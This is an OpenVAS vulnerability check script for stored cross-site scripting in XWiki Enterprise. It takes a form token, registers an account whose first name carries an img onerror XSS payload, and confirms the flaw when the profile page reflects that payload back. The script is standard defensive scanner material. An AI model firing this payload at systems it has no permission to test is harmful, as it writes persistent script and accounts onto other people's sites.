###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xwiki_enterprise_mult_stored_xss_vuln.nasl 8374 2018-01-11 10:55:51Z cfischer $
#
# XWiki Enterprise Multiple Stored Cross-Site Scripting Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to insert
arbitrary HTML and script code, which will be executed in a user's browser
session in the context of an affected site.

Impact Level: Application";

tag_affected = "XWiki version 4.2-milestone-2 and prior";

tag_insight = "The flaws are due to improper validation of user-supplied input via
- the 'First Name', 'Last Name' , 'Company', 'Phone', 'Blog', 'Blog Feed'
  field when editing a user's profile
- the 'Label' field in WYSIWYG Editor when creating a link.
- the 'SPACE NAME' field when creating a new space.
  Which allows attackers to execute arbitrary HTML and script code in a
  user's browser session in the context of an affected site.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running XWiki Enterprise and is prone to cross site
scripting vulnerabilities.";

CPE = "cpe:/a:xwiki:xwiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802671");
  script_version("$Revision: 8374 $");
  script_bugtraq_id(55235);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-01-11 11:55:51 +0100 (Thu, 11 Jan 2018) $");
  script_tag(name:"creation_date", value:"2012-08-30 19:24:16 +0530 (Thu, 30 Aug 2012)");
  script_name("XWiki Enterprise Multiple Stored Cross-Site Scripting Vulnerabilities");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/78026");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20856/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/115939/XWiki-4.2-milestone-2-Cross-Site-Scripting.html");

  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_dependencies("gb_xwiki_enterprise_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("xwiki/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variables Initialization
host = "";
url  = "";
dir  = "";
req  = "";
res  = "";
xss  = "<img src='1.jpg'onerror=javascript:alert(0)>";
sndReq = "";
rcvRes = "";
postdata = "";
xwikiPort = 0;
tokenValue = "";

## Stored XSS (Not a safe check)
if(safe_checks()){
  exit(0);
}

if(!xwikiPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_dir_from_kb(port:xwikiPort, app:"XWiki")){
  exit(0);
}

host = http_host_name(port:xwikiPort);

## Construct the Attack Request
url = dir + "/bin/register/XWiki/Register";

## Send Register request and Receive the response
sndReq = http_get(item:url, port:xwikiPort);
rcvRes = http_keepalive_send_recv(port:xwikiPort, data:sndReq);

##Get the  form_token value from Response
tokenValue = eregmatch(pattern:'name="form_token" value="([a-zA-Z0-9]+)"',
                       string:rcvRes);

if(!tokenValue || !tokenValue[1]){
  exit(0);
}

## Construct the POST data
postdata = "form_token="+ tokenValue[1] +
           "&parent=xwiki%3AMain.UserDirectory&" +
           "register_first_name=" + xss + "&" +
           "register_last_name=&" +
           "xwikiname=ThisUserNameDefinitelyNotExists&" +
           "register_password=password&" +
           "register2_password=password&" +
           "register_email=&" +
           "template=XWiki.XWikiUserTemplate&"   +
           "xredirect=";

## Construct the POST request
req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
             "Referer: http://", host, url, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postdata), "\r\n",
             "\r\n", postdata);

## Send XSS attack
res = http_keepalive_send_recv(port:xwikiPort, data:req);

if (res)
{
  ## Confirm the Attack by opening the registered profile
  url = dir + "/bin/view/XWiki/ThisUserNameDefinitelyNotExists";

  if(http_vuln_check(port:xwikiPort, url:url, check_header: TRUE,
     pattern:"<img src='1.jpg'onerror=javascript:alert\(0\)>"))
  {
    security_message(port:xwikiPort);
    exit(0);
  }
}
